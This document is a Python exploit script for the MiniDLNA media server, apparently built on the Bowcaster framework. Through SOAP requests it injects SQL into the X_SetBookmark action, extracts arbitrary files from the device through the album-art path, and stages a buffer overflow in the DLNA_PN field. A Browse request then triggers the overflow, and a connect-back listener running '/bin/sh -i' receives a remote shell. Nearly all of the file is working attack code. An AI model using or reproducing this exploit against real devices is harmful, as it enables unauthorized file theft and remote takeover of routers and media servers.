#!/usr/bin/env python

import sys
import time
from dlna_overflow import DLNA_Overflow
from minidlna_verification import MinidlnaVerifier
from bowcaster.common.support import Logging
from bowcaster.clients import HttpClient,HTTPError
from bowcaster.servers.connectback_server import ConnectbackServer
from bowcaster.common.support import pretty_string

class SoapRequestXSetBookmark(object):
    SOAP_HEADERS={"HOST":"127.0.0.1",
                  "SOAPACTION":'"urn:schemas-upnp-org:service:ContentDirectory:1#X_SetBookmark"',
                  "CONTENT-TYPE":'text/xml;charset="utf-8"'
                  }
    PATH="/ctl/ContentDir"
    
    INJECT_START='1);'
    INJECT_END=";--"
    
    def __init__(self,target_ip,inject_string=None,port=8200):
        self.target_ip=target_ip
        self.port=port
        
        self.request_xml=open("./soap_x_setbookmark.xml","rb").read()
        if inject_string:
            request=self.request_xml.replace("INJECT",inject_string);
            self.request_xml=request
    
    def send_request(self,request=None):
        if not request:
            print("Request was none. Setting to self.request_xml")
            request=self.request_xml
        else:
            print("Using request passed as parameter.")
            
        cls=self.__class__
        url="http://%s:%s%s" % (self.target_ip,self.port,cls.PATH)
        client=HttpClient()
        print("Sending SOAP request:\n%s" % request)
        print("")
        resp=client.send(url,post_data=request,headers=cls.SOAP_HEADERS)
        return resp

class SoapSetBookmarkClearAlbumArt(SoapRequestXSetBookmark):
    DELETE_ALBUM_ART=('DELETE from ALBUM_ART where ID=%s')
    
    def __init__(self,target_ip,port=8200,albumart_id="31337",logger=None):
        cls=self.__class__
        if not logger:
            logger=Logging()
        
        logger.LOG_DEBUG("Creating SOAP request to delete id %s from ALBUM_ART." % albumart_id)
        inject_details=cls.DELETE_ALBUM_ART % albumart_id
        inject_string=cls.INJECT_START+inject_details+cls.INJECT_END
        logger.LOG_DEBUG("Injection string:\n\t%s" % inject_string)
        super(cls,self).__init__(target_ip,port=port,inject_string=inject_string)

class SoapSetBookmarkAlbumArtFileExtract(SoapRequestXSetBookmark):
    INSERT_ALBUM_ART=('INSERT into ALBUM_ART(ID,PATH) VALUES(%s,"%s")')
    
    def __init__(self,target_ip,path,port=8200,albumart_id="31337",logger=None):
        cls=self.__class__
        if not logger:
            logger=Logging()
        logger.LOG_INFO("path to extract: %s" % path)
        logger.LOG_INFO("Album art id: %s" % albumart_id)
        
        inject_details=cls.INSERT_ALBUM_ART % (albumart_id,path)
        inject_string=cls.INJECT_START
        inject_string+=inject_details
        inject_string+=cls.INJECT_END
        logger.LOG_DEBUG("Injection string:\n\t%s" % inject_string)
        self.extraction_url="http://%s:%d/AlbumArt/%s-1.jpg" % (target_ip,port,albumart_id)
        
        super(self.__class__,self).__init__(target_ip,port=port,inject_string=inject_string)

class SoapSetBookmarkStageDetails(SoapRequestXSetBookmark):
    #MIME has to start with a 'v' presumably for video
    INSERT_DETAILS=('INSERT into DETAILS(ID,SIZE,TITLE,ARTIST,TRACK,DLNA_PN,MIME,ALBUM_ART,DISC) ' +
                        'VALUES(%s,"PWNED","PWNED","PWNED","PWNED","%s","v_PWNED","PWNED","PWNED")')
    DLNA_PN="AVC_TS_MP_SD_AC3"
    
    def __init__(self,target_ip,port=8200,detail_id="31337"):
        cls=self.__class__
        inject_details=cls.INSERT_DETAILS % (detail_id,cls.DLNA_PN)

        inject_string=cls.INJECT_START
        inject_string+=inject_details
        inject_string+=cls.INJECT_END
        super(self.__class__,self).__init__(target_ip,port=port,inject_string=inject_string)

class SoapSetBookmarkStageObjects(SoapRequestXSetBookmark):
    INSERT_OBJECTS=('INSERT into OBJECTS(OBJECT_ID,PARENT_ID,CLASS,DETAIL_ID) ' +
                    'VALUES("PWNED","PWNED","item.audioItem.musicTrack",%s)')
    
    def __init__(self,target_ip,port=8200,detail_id="31337"):
        cls=self.__class__
        inject_objects=cls.INSERT_OBJECTS % detail_id;
        inject_string=cls.INJECT_START+inject_objects+cls.INJECT_END
        super(self.__class__,self).__init__(target_ip,port=port,inject_string=inject_string)


class SoapSetBookmarkAppendDLNA_PN(SoapRequestXSetBookmark):
    APPEND_DLNA_PN=('UPDATE DETAILS set DLNA_PN=DLNA_PN||"%s" where ID=%s')
    
    #for using when we need to insert a single quote
    #appended string will be literally: '''' which will be condensed by
    #sqlite to: '
    APPEND_DLNA_PN_NOQUOTES=('UPDATE DETAILS set DLNA_PN=DLNA_PN||%s where ID=%s')
    
    def __init__(self,target_ip,overflow_string,port=8200,detail_id="31337"):
        #TODO: break overflow string into parts to separate out single quotes
        cls=self.__class__
        inject_strings=[]
        parts=self.make_parts(overflow_string)
        
        print ("split overflow string into %d parts." % (len(parts)))
        for part in parts:
            print("Part %s: " % pretty_string(part))
            if part=="''":
                append=cls.APPEND_DLNA_PN_NOQUOTES % (part,detail_id)
            else:
                append=cls.APPEND_DLNA_PN % (part,detail_id)
            
            inject_string=cls.INJECT_START+append+cls.INJECT_END
            inject_strings.append(inject_string)
            
        self.inject_strings=inject_strings
        super(self.__class__,self).__init__(target_ip,port=port,inject_string=None)
    
    def make_parts(self,string):
        parts=string.split("'")
        if len(parts) < 2:
            return parts
        
        #print("got %d parts." % len(parts))
        newparts=[]
    
    
        for i in range(0,len(parts)):
            string=parts[i]
            if len(string)>0:
                newparts.append(string)
            if i != (len(parts)-1):
                newparts.append("''")
            
        return newparts
          
    def send_all_requests(self):
        for inject_string in self.inject_strings:
            print("Inject string: %s" % inject_string)
            request=self.request_xml.replace("INJECT",inject_string);
            self.send_request(request=request)

        

class SoapSetBookmarkDelete(SoapRequestXSetBookmark):
    DELETE_DETAILS=" DELETE from DETAILS where ID=%s"
    DELETE_OBJECTS=" DELETE from OBJECTS where DETAIL_ID=%s"
    
    def __init__(self,target_ip,port=8200,detail_id="31337"):
        cls=self.__class__
        self.inject_delete_details=(cls.INJECT_START +
                                    cls.DELETE_DETAILS % (detail_id) +
                                    cls.INJECT_END)
                                    
        self.inject_delete_objects=(cls.INJECT_START + 
                                    cls.DELETE_OBJECTS % (detail_id) +
                                    cls.INJECT_END)
        
        super(self.__class__,self).__init__(target_ip,port=port,inject_string=None)
        
    def send_all_requests(self):
        request=self.request_xml.replace("INJECT",self.inject_delete_details)
        self.send_request(request=request)
        
        request=self.request_xml.replace("INJECT",self.inject_delete_objects)
        self.send_request(request=request)
        

class BrowseExploit(object):
    PATH="/ctl/ContentDir"
    SOAP_HEADERS={"Host":"127.0.0.1",
                    "SOAPACTION":'"urn:schemas-upnp-org:service:ContentDirectory:1#Browse"',
                    "content-type":'text/xml ;charset="utf-8"',
                    #BRAVIA gets special munging of DLNA_PN
                    "X-AV-Client-Info":"BRAVIA",
                    "connection":"close"}
                    
    def __init__(self,target_ip,port=8200,object_id="PWNED"):
        self.target_ip=target_ip
        self.port=port
        self.object_id=object_id
        
        request_xml=open("./browse_request.xml","rb").read()
        self.request_xml=request_xml.replace("EXPLOIT_OBJECT_ID",object_id)

    def send_request(self):
        request=self.request_xml
        cls=self.__class__
        url="http://%s:%s%s" % (self.target_ip,self.port,cls.PATH)
        client=HttpClient()
        #print("Sending SOAP request:\n%s" % request)
        #print("")
        resp=client.send(url,post_data=request,headers=cls.SOAP_HEADERS)
        return resp

def chunks(string, n):
    return [ string[x:x+n] for x in range(0, len(string), n)]

def albumart_extract(host,path,outfile=None,logger=None):
    if not logger:
        logger=Logging
    
    logger.LOG_DEBUG("Removing old album art record.")
    request_object=SoapSetBookmarkClearAlbumArt(host,logger=logger)
    resp=request_object.send_request()
    logger.LOG_DEBUG("response: %s" % str(resp))
    
    request_object=SoapSetBookmarkAlbumArtFileExtract(host,path,logger=logger)
    resp=request_object.send_request()
    logger.LOG_DEBUG("response: %s" % str(resp))
    
    client=HttpClient()
    url=request_object.extraction_url
    resp=client.send(url)
    logger.LOG_INFO("Got response. %d bytes." % len(resp))
    
    if outfile:
        logger.LOG_INFO("Writing response to %s." % outfile)
        open(outfile,"wb").write(resp)

    return resp

def do_verification(host,port=8200,logger=None):
    if not logger:
        logger=Logging()
    data=albumart_extract(host,"/usr/sbin/minidlna.exe",logger=logger)
    verifier=MinidlnaVerifier(data)
    logger.LOG_INFO("MD5 of minidlna binary: %s" % verifier.hexdigest)
    if verifier.versions:
        logger.LOG_INFO("\tFirmware version: %s\n\tminidlna version: %s" % (verifier.versions[0],verifier.versions[1]))
        return True
    else:
        logger.LOG_WARN("Minidlna binary did not match known hash.")
        return False
    

def main(host,port=8200,connectback_ip=None,find_str=None,path=None,outfile=None):
    logger=Logging()
    if path:
        logger.LOG_DEBUG("main() got path=%s" % path)
        albumart_extract(host,path,outfile,logger=logger)
        exit(0)
        
    buf=DLNA_Overflow(1536,connectback_ip).buf
    
    logger.LOG_DEBUG("overflow string:\n%s" % buf.pretty_string())
    
    if find_str:
        logger.LOG_INFO("Finding offset of %s" % find_str)
        find=find_str
        if find_str.startswith("0x"):
            find=int(find_str,16)
    
        offset=buf.find_offset(find)
        logger.LOG_INFO("Offset: %s" % offset)
        exit(0)

    
    if not do_verification(host,port=port,logger=logger):
        exit(1)
    
    exit(0)
    request_object=SoapSetBookmarkDelete(host)
    request_object.send_all_requests()
    
    request_object=SoapSetBookmarkStageDetails(host)
    request_object.send_request()
    
    request_object=SoapSetBookmarkStageObjects(host)
    request_object.send_request()
    


    overflow=str(buf)
    open("overflow.bin","wb").write(overflow)
    
    logger.LOG_DEBUG("Overflow string: %s" % overflow)
    request_object=SoapSetBookmarkAppendDLNA_PN(host,overflow)
    request_object.send_all_requests()

    logger.LOG_INFO("Browsing exploit.")
    server=ConnectbackServer(connectback_ip,startcmd="/bin/sh -i")
    server.serve()
    try:
        request_object=BrowseExploit(host)
        resp=request_object.send_request()
    except Exception as e:
        logger.LOG_WARN("Error browsing exploit: %s" % (str(e)))
        server.shutdown()
        raise e
    server.wait()
#    logger.LOG_DEBUG(resp)
    
    
if __name__ == "__main__":
    if sys.argv[1].startswith("find="):
        find_str=sys.argv[1].split("=")[1]
        main(None,find_str=find_str,connectback_ip=sys.argv[2])
    elif sys.argv[2].startswith("extract="):
        path=sys.argv[2].split("=")[1]
        print "Got path: %s" % path
        
        main(sys.argv[1],outfile=sys.argv[3],connectback_ip=None,path=path)
    else:
        main(sys.argv[1],connectback_ip=sys.argv[2])